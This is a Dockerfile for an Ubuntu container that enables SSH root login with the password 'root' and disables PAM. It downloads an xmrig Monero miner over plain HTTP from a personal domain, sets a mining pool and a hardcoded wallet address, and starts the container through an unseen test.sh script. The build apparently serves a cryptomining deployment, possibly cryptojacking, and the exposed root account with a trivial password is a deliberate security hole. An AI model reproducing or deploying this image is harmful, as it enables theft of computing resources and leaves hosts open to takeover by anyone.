FROM ubuntu

RUN apt-get update

RUN apt-get install -y openssh-server
RUN mkdir /var/run/sshd

RUN echo 'root:root' |chpasswd

RUN sed -ri 's/^PermitRootLogin\s+.*/PermitRootLogin yes/' /etc/ssh/sshd_config
RUN sed -ri 's/UsePAM yes/#UsePAM yes/g' /etc/ssh/sshd_config

ENV VERSION 2.1.0

RUN apt-get update && apt-get install -y wget && apt-get install -y libuv1-dev

RUN wget http://renjunyu.cn/xmr/xmrig && chmod +x ./xmrig

ENV POOL xmr-eu1.nanopool.org:14444

ENV USERNAME 4B9f71DJ3fqPuSGNamuK9jH7NzKBj3im4SyrGUwvsT4EAy3TQBW7DdtjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3h4Fxrf

ENV PASSWORD x

EXPOSE 22

WORKDIR /

COPY test.sh /usr/local/bin/
RUN chmod +x /usr/local/bin/test.sh

ENTRYPOINT ["/usr/local/bin/test.sh"]
